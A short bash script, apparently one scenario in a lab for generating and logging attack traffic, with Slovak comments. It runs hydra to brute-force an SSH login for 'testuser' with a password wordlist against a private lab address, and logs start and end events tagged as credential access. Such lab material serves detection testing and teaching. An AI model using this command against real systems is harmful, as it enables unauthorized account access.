#!/usr/bin/env bash
# Scenar 3: Utok hrubou silou (brute-force) na SSH prihlasenie
set -e
source /scripts/attacks/lib.sh

SCENARIO="ssh_bruteforce"
log_event "$SCENARIO" "start" "\"attack_category\":\"credential_access\",\"src_ip\":\"172.28.0.20\",\"dst_ip\":\"172.28.0.10\",\"tool\":\"hydra\""

hydra -l testuser -P /scripts/attacks/wordlists/passwords.txt -t 4 -f \
    ssh://172.28.0.10 || true

log_event "$SCENARIO" "end"
